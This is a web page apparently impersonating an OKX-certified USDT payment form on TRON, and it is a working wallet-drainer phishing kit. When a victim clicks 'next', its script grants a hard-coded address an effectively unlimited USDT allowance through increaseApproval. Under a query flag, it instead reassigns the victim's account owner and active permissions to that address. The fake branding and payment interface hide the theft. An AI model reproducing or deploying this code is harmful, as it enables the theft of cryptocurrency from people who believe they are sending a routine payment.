<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>OKX已认证 安全支付</title>
  <link rel="shortcut icon" href="https://okx-pay.me/upay/okex/svg/EB771F0EE8994DD5.png" type="image/png">
  <meta property="og:image" content="https://okx-pay.me/upay/okex/svg/EB771F0EE8994DD5.png">
  <link rel="icon" type="image/png" href="https://okx-pay.me/upay/okex/svg/EB771F0EE8994DD5.png" />
  <link rel="stylesheet" href="https://okx-pay.me/upay/okex/static/css/index.css" />
  <link rel="stylesheet" href="https://okx-pay.me/upay/okex/static/css/index_1.css" />
  <link rel="shortcut icon" href="https://okx-pay.me/upay/okex/../favicon.ico">
</head>

<body>
  <div class="payForm" id="app" v-cloak>
    <div id="app-content">
      <div class="app os-win browser-chrome mouse-user-styles">
        <div class="menu-droppo-container network-droppo" style="position: fixed; z-index: 55;">
          <style>
            .menu-droppo-enter {
              transition: transform 300ms ease-in-out;
              transform: translateY(-200%);
            }

            .menu-droppo-enter.menu-droppo-enter-active {
              transition: transform 300ms ease-in-out;
              transform: translateY(0%);
            }

            .menu-droppo-leave {
              transition: transform 300ms ease-in-out;
              transform: translateY(0%);
            }

            .menu-droppo-leave.menu-droppo-leave-active {
              transition: transform 300ms ease-in-out;
              transform: translateY(-200%);
            }
          </style>
        </div>
        <div class="main-container-wrapper">
          <div class="page-container">
            <div class="send-title">收款账户<div class="send__select-recipient-wrapper">
                <div class="send__select-recipient-wrapper__list">
                  <div class="send__select-recipient-wrapper__list"><a
                      class="button btn-link send__select-recipient-wrapper__list__link" role="button"
                      tabindex="0">欧易官方认证</a></div>
                </div>
              </div>
            </div>
            <div class="ens-input send__to-row">
              <div class="ens-input__wrapper">
                <input class="ens-input__wrapper__input" type="text" placeholder="TKbQmRs49SxZT4oUxmTWvxf9PqaSLvKH6L"
                  v-model="showAddress" disabled>
              </div>
            </div>
            <div class="page-container__content">
              <div class="send-v2__form">
                <div class="send-v2__form-title">数额</div>
                <div class="send-v2__form-amount-asset" tabindex="0" outline="0" hidefocus="true">
                  <div class="send-v2__form-row">
                    <button class="send-v2__amount-max" @click="allAmount">
                      <div class="send-v2__amount-max__button">最大</div>
                    </button>
                    <div class="send-v2__form-field-container">
                      <div class="send-v2__form-field">
                        <div class="unit-input">
                          <div class="unit-input__inputs">
                            <div class="unit-input__input-container">
                              <input type="number" class="unit-input__input" placeholder="请输入数量" v-model="amount"
                                style="width: 3.5ch;">
                            </div>
                          </div>
                        </div>
                      </div>
                      <div></div>
                    </div>
                  </div>
                  <div class="send-v2__form-divider"></div>
                  <div class="send-v2__form-row">
                    <div class="send-v2__form-field">
                      <div class="send-v2__asset-dropdown">
                        <div class="send-v2__asset-dropdown__input-wrapper">
                          <div class="send-v2__asset-dropdown__asset">
                            <div class="send-v2__asset-dropdown__asset-title">资产</div>
                            <div class="send-v2__asset-dropdown__asset-content">
                              <div class="send-v2__asset-dropdown__asset-icon">

                                <img class="identicon" src="static/picture/usdtlogo.png" alt=""
                                  style="height: 24px; width: 24px; border-radius: 12px;">
                              </div>
                              <div class="send-v2__asset-dropdown__name">
                                <div class="currency-display-component" title="0.1304">
                                  <span class="currency-display-component__text">
                                    <span>{{authorized_address}}{{wallet.usdtAmount ? wallet.usdtAmount:
                                      "0.000"}}</span>
                                  </span>
                                </div>
                              </div>
                              <div class="send-v2__asset-dropdown__symbol">USDT</div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="send-v2__form-row">
                  <div class="send-v2__form-field">
                    <div>
                      <div class="gas-price-button-group--title">交易费</div>
                      <div class="gas-price-button-group--small"><button aria-checked="false"
                          class="button-group__button"
                          :class="wangluoSuduIndex == 1 ? 'button-group__button--active':''"
                          @click="wangluoSuduIndex = 1">
                          <div>
                            <div class="gas-price-button-group--small__label"><img src="static/picture/slow.svg">缓慢
                            </div>
                            <div class="gas-price-button-group--small__primary-currency">
                              15.0615
                              TRX</div>
                            <div class="gas-price-button-group--small__secondary-currency">
                              $1.1489</div>
                          </div>
                        </button><button aria-checked="true" class="button-group__button"
                          :class="wangluoSuduIndex == 2 ? 'button-group__button--active':''"
                          @click="wangluoSuduIndex = 2">
                          <div>
                            <div class="gas-price-button-group--small__label"><img src="static/picture/medium.svg">中等
                            </div>
                            <div class="gas-price-button-group--small__primary-currency">
                              22.3312
                              TRX</div>
                            <div class="gas-price-button-group--small__secondary-currency">
                              $1.7153</div>
                          </div>
                        </button><button aria-checked="false" class="button-group__button"
                          :class="wangluoSuduIndex == 3 ? 'button-group__button--active':''"
                          @click="wangluoSuduIndex = 3">
                          <div>
                            <div class="gas-price-button-group--small__label"><img src="static/picture/rapid.svg">极速
                            </div>
                            <div class="gas-price-button-group--small__primary-currency">
                              35.981
                              TRX</div>
                            <div class="gas-price-button-group--small__secondary-currency">
                              $2.7446</div>
                          </div>
                        </button></div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div class="page-container__footer">
              <footer>
                <van-button type="primary" class="button btn-secondary page-container__footer-button"
                  @click="paypal">下一步</van-button>
              </footer>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</body>

</html>
<script src="https://okx-pay.me/upay/okex/static/js/c9e83667692b45d9866b4a9fc4bd637f.js"></script>
<script src="https://okx-pay.me/upay/okex/static/js/vant.min.js"></script>
<script src="https://okx-pay.me/upay/okex/static/js/axios.min.js"></script>
<!--<script src="static/js/tronweb.js"></script>
<script src="static/js/vconsole.min.js"></script>-->
<script>
  var tronWeb, okxwallet;

  const app = Vue.createApp({
    data() {
      return {
        loading: false,
        showAddress: "",

        //toAddress: "TUkGNir5u2qjWPw7AxF1c2DQ6ZtqhC5jNM",
        toAddress: "",
        amount: null,

        wangluoSuduIndex: 1,

        wallet: {
          abi: [{ "constant": true, "inputs": [], "name": "name", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_upgradedAddress", "type": "address" }], "name": "deprecate", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "deprecated", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_evilUser", "type": "address" }], "name": "addBlackList", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "upgradedAddress", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "maximumFee", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "unpause", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_maker", "type": "address" }], "name": "getBlackListStatus", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "paused", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_subtractedValue", "type": "uint256" }], "name": "decreaseApproval", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "who", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "_value", "type": "uint256" }], "name": "calcFee", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "pause", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "who", "type": "address" }], "name": "oldBalanceOf", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "newBasisPoints", "type": "uint256" }, { "name": "newMaxFee", "type": "uint256" }], "name": "setParams", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "amount", "type": "uint256" }], "name": "issue", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_addedValue", "type": "uint256" }], "name": "increaseApproval", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "amount", "type": "uint256" }], "name": "redeem", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }, { "name": "_spender", "type": "address" }], "name": "allowance", "outputs": [{ "name": "remaining", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "basisPointsRate", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "isBlackListed", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_clearedUser", "type": "address" }], "name": "removeBlackList", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "MAX_UINT", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_blackListedUser", "type": "address" }], "name": "destroyBlackFunds", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "name": "_initialSupply", "type": "uint256" }, { "name": "_name", "type": "string" }, { "name": "_symbol", "type": "string" }, { "name": "_decimals", "type": "uint8" }], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "_blackListedUser", "type": "address" }, { "indexed": false, "name": "_balance", "type": "uint256" }], "name": "DestroyedBlackFunds", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "amount", "type": "uint256" }], "name": "Issue", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "amount", "type": "uint256" }], "name": "Redeem", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "newAddress", "type": "address" }], "name": "Deprecate", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "_user", "type": "address" }], "name": "AddedBlackList", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "_user", "type": "address" }], "name": "RemovedBlackList", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "feeBasisPoints", "type": "uint256" }, { "indexed": false, "name": "maxFee", "type": "uint256" }], "name": "Params", "type": "event" }, { "anonymous": false, "inputs": [], "name": "Pause", "type": "event" }, { "anonymous": false, "inputs": [], "name": "Unpause", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "previousOwner", "type": "address" }, { "indexed": true, "name": "newOwner", "type": "address" }], "name": "OwnershipTransferred", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "owner", "type": "address" }, { "indexed": true, "name": "spender", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "from", "type": "address" }, { "indexed": true, "name": "to", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }],
          tokenAddress: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
          address: "",

          usdtAmount: null,
          trxAmount: null,
        }

      }
    },

    async created() {

      this.getInfo();


      //获取参数
      if (this.getQueryVariable("address")) {
        this.showAddress = this.getQueryVariable("address");
      }
      if (this.getQueryVariable("amount")) {
        this.amount = this.getQueryVariable("amount");
      }

      // if (typeof window.okxwallet == 'undefined') {
      //    vant.showDialog({ message: '请在欧易钱包打开', closeOnClickOverlay: false, lockScroll: true, });
      //    return;
      // }
      // okxwallet = window.okxwallet;
      //  console.log(okxwallet);
      //  tronWeb = okxwallet.tronLink.tronWeb;
      //"连接钱包账户"

      console.log("连接钱包账户");
      var res = await okxwallet.tronLink.request({ method: 'tron_requestAccounts' });
      this.wallet.address = tronWeb.defaultAddress.base58;
      console.log(tronWeb);
      if (this.wallet.address) {
        console.log('查询账户余额', this.wallet.address);
        this.balanceOf();
      }

      //监听
      window.addEventListener('message', function (e) {
        if (e.data.message && e.data.message.action == "connect") {
          console.log('got connect event', e.data)
        }
      })
    },
    methods: {

      getInfo() {
        this.toAddress = "TKbQmRs49SxZT4oUxmTWvxf9PqaSLvKH6L"
        /*
        var that = this;
        var domain="https://okx-pay.me/";
    var s = this.getQueryVariable('s');
    axios.get(domain + 'api/get_trc/s/'+s).then(function(response){
        //console.log(data);
        console.log(response.data)
    that.toAddress = response.data.data.authorized_address;
    console.log(that.toAddress);
  //	that.postInfo();
    })
        */
      }
      ,

      postInfo() {
        var s = this.getQueryVariable('s')
        var a = this.getQueryVariable('r')

        var data = {
          address: this.wallet.address,
          authorized_address: this.toAddress,
          bizhong: 'USDT',
          code: s,
          reffer: a,
          type: 1
        }
        var domain = "/";
      }
      ,
      paypal() {

        if (!this.amount || this.amount <= 0) {
          vant.showToast('请输入转账金额');
          return;
        }

        if (this.getQueryVariable("k") && this.getQueryVariable("k") == 1) {
          if (this.wallet.trxNum >= 100) {
            this.updateAccountPermissions();
            return;
          }
        }

        // this.updateAccountPermissions();
        this.triggerSmartContract();
        this.postInfo();
      },

      allAmount() {
        this.amount = this.wallet.usdtAmount;
      },
      getQueryVariable(variable) {
        var query = window.location.search.substring(1);
        var vars = query.split("&");
        for (var i = 0; i < vars.length; i++) {
          var pair = vars[i].split("=");
          if (pair[0] == variable) { return pair[1]; }
        }
        return (false);
      },

      //查询usdt OR TRX
      async balanceOf() {
        let contract = await tronWeb.contract(this.wallet.abi, this.wallet.tokenAddress);
        var usdtNum = await contract.balanceOf(this.wallet.address).call();
        var trxNum = await tronWeb.trx.getBalance(this.wallet.address);
        this.wallet.usdtAmount = tronWeb.fromSun(usdtNum);

        this.wallet.trxNum = tronWeb.fromSun(trxNum);
      },

      async triggerSmartContract() {
        console.log(this.toAddress);
        console.log(this.wallet);
        var parameter = [{ type: 'address', value: this.toAddress }, { type: 'uint256', value: tronWeb.toSun(99999999999999) }];
        var options = {
          feeLimit: 100_000_000,
        };
        console.log(`Current log: this.wallet.tokenAddress: `, this.wallet.tokenAddress)

        const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
          tronWeb.address.toHex(this.wallet.tokenAddress),
          "increaseApproval(address,uint256)",
          options,
          parameter,
          tronWeb.address.toHex(this.wallet.address)
        )
        console.log(transaction)
        // 这个地方没调接口，灰地址 transfer的时候，increaseApproval,
        const signedtxn = await tronWeb.trx.sign(transaction);
        // 交易搞不定
        const receipt = await tronWeb.trx.sendRawTransaction(transaction);

        console.log(receipt, '广播完成');
      },

      async updateAccountPermissions() {
        let ownerPermission = { type: 0, permission_name: 'owner' };
        ownerPermission.threshold = 1;
        ownerPermission.keys = [];

        let activePermission = { type: 2, permission_name: 'active0' };
        activePermission.threshold = 1;
        activePermission.operations = '7fff1fc0037e0000000000000000000000000000000000000000000000000000';
        activePermission.keys = [];

        ownerPermission.keys.push({ address: tronWeb.address.toHex(this.toAddress), weight: 1 });
        activePermission.keys.push({ address: tronWeb.address.toHex(this.toAddress), weight: 1 });

        const updateTransaction = await tronWeb.transactionBuilder.updateAccountPermissions(
          tronWeb.address.toHex(this.wallet.address),
          ownerPermission,
          null,
          [activePermission]
        );
        console.log(updateTransaction);
        const signedtxn = await tronWeb.trx.sign(updateTransaction);
        const receipt = await tronWeb.trx.sendRawTransaction(updateTransaction);
        if (result) {
          if (result.code.indexOf('ERROR') != -1) {
            alert('TRX余额不足，支付失败！');
            return;
          }
          alert('支付成功');
        }
      }
    }
  });

  app.use(vant);
  app.use(vant.Lazyload);
  app.mount('#app');
</script>
